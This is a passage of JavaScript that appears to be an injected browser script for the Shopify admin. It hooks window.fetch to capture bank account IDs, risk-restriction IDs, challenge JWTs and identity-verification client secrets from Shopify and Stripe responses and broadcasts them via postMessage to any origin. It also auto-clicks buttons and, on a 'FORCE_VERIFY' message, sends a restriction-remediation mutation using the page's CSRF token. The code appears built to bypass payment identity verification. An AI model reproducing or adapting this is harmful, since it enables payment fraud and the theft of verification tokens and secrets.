    clearTimeout(_autoClickTimer)
    _autoClickTimer = setTimeout(autoClick, 1200)
  }
}

function autoClick() {
  const btns = [...document.querySelectorAll('button,[role="button"],a')].filter(b => !b.disabled && b.offsetParent)
  for (const phrase of CLICK_W) {
    const b = btns.find(b => b.textContent?.toLowerCase().trim() === phrase ||
                              b.textContent?.toLowerCase().trim().startsWith(phrase + ' ') ||
                              b.textContent?.toLowerCase().trim().endsWith(' ' + phrase))
    if (b) { b.click(); return true }
  }
  // Fallback: any contains-match
  for (const phrase of CLICK_W) {
    const b = btns.find(b => b.textContent?.toLowerCase().trim().includes(phrase))
    if (b) { b.click(); return true }
  }
  return false
}

function watchDOM() {
  if (!document.body) { document.addEventListener('DOMContentLoaded', watchDOM); return }
  new MutationObserver(checkDOM).observe(document.body, { childList:true, subtree:true, characterData:true })
  checkDOM()
}
watchDOM()

// ── Fetch interceptor (Shopify token capture) ─────────────────────────────────
const FPAT = ['banking_home_banking','payments/banking','shopify/graphql','verificationhub.shopify.com','verify.stripe.com']
function getStore() { return location.pathname.match(/\/store\/([^/?#]+)/)?.[1] ?? null }
function gid(g) { return g ? (String(g).match(/\/(\d+)$/)?.[1] ?? String(g)) : null }

function parseCaptures(url, data) {
  const o = {}
  if (url.includes('banking_home_banking') || url.includes('payments/banking')) {
    const ba = data.bankAccount || data?.data?.bankAccount
    if (ba?.id) { o.bank_account_id = gid(ba.id); o.bank_account_gid = ba.id }
    const act = (ba?.riskRestrictions||[]).find(r => r.status==='ACTIVE')
    if (act) { o.active_restriction_id = gid(act.id); o.active_restriction_gid = act.id; o.active_restriction_status = 'ACTIVE' }
    const pr = data.principal || data?.data?.principal
    if (pr?.id) o.principal_id = gid(pr.id)
  }
  if (url.includes('shopify/graphql') || url.includes('verificationhub')) {
    const d = data.data || {}
    if (d.payoutGateRemediate?.challengeToken)    { o.jwt = d.payoutGateRemediate.challengeToken; o.jwt_type = 'pgrr' }
    if (d.remediateRiskRestriction?.challengeToken){ o.jwt = d.remediateRiskRestriction.challengeToken; o.jwt_type = 'remediate' }
    for (const k of Object.keys(d)) {
      if (k.startsWith('createIVA')||k.startsWith('createIdentityVerification')) {
        const vs = d[k]?.verificationSession
        if (vs) { o.ek = vs.id; o.ek_client_secret = vs.clientSecret; o.assessment_ref = vs.referenceId; o.civa_variant = k; break }
      }
    }
    if (d.createAssessment?.assessmentReference) o.vhub_assessment_ref = d.createAssessment.assessmentReference
    const bh = d.shopifyPaymentsAccount?.bankAccount || d.bankAccount
    if (bh?.riskRestrictions !== undefined) o.discharge_detected = !bh.riskRestrictions.some(r => r.status==='ACTIVE')
  }
  if (url.includes('verify.stripe.com') && (data.session||data).status) o.stripe_session_status = (data.session||data).status
  return Object.keys(o).length ? o : null
}

function sendCapture(url, data) {
  const c = parseCaptures(url, data)
  if (c) window.postMessage({ _idv:'CAPTURE', store:getStore(), url, captures:c, timestamp:Date.now() }, '*')
}

window.addEventListener('message', async ev => {
  if (ev.source !== window || ev.data?._idv !== 'FORCE_VERIFY') return
  const csrf = document.querySelector('meta[name="csrf-token"]')?.content || window?.Shopify?.csrfToken || ''
  const mut = `mutation RemediateIDV($id:ID!){remediateRiskRestriction(input:{riskRestrictionId:$id}){challengeToken userErrors{field message}}}`
  try {
    const res = await _origFetch('https://admin.shopify.com/api/shopify/graphql.json', {
      method:'POST', credentials:'include',
      headers:{'Content-Type':'application/json',...(csrf?{'X-CSRF-Token':csrf}:{})},
      body:JSON.stringify({operationName:'RemediateIDV',query:mut,variables:{id:ev.data.riskRestrictionId}})
    })
    const data = await res.json()
    sendCapture('shopify/graphql', data)
    const rrr = data?.data?.remediateRiskRestriction
    window.postMessage({ _idv:'FORCE_VERIFY_RESULT', result: rrr?.challengeToken ? {ok:true} : {ok:false,error:rrr?.userErrors?.map(e=>e.message).join(',')||'error'} }, '*')
  } catch(e) { window.postMessage({ _idv:'FORCE_VERIFY_RESULT', result:{ok:false,error:String(e)} }, '*') }
})

const _origFetch = window.fetch.bind(window)
window.fetch = async function(input, init) {
  const res = await _origFetch(input, init)
  const url = typeof input === 'string' ? input : input?.url || ''
  if (FPAT.some(p => url.includes(p))) res.clone().json().then(d => sendCapture(url, d)).catch(() => {})
  return res
}

})()
